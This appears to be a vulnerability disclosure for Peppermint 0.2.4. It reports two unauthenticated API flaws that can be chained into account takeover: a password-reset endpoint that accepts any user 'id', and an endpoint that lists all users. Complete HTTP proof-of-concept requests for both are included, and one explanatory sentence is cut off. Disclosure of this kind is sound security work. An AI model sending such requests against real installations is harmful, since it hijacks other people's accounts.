# Peppermint-Lab  - Broken Access Control


**CVE-ID:** -


**Vendor:** [Peppermint-Lab](https://peppermint.sh)

**Affected Product:** Peppermint

**Affected Versions:** 0.2.4

**Vulnerability:** Broken Access Control

**Status:** Unfixed

**Severity:** Critical


## Details

The password reset endpoint (`/api/v1/users/resetpassword`) allows any unauthenticated user to change passwords
of any other user by just incrementing the `id` JSON parameter.


```
POST /api/v1/users/resetpassword HTTP/1.1
Host: localhost:5000
Content-Length: 35
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36
sec-ch-ua-platform: "Linux"
Content-Type: application/json
Accept: */*
Origin: http://localhost:5000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:5000/settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"password":"changeme5678","id":1}
```

The request above changes the password of the user 


The api endpoint `/api/v1/users/all` gives a list of all users (with their id) to unauthenticated users.


```
GET /api/v1/users/all HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:5000/
Content-Type: application/json
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

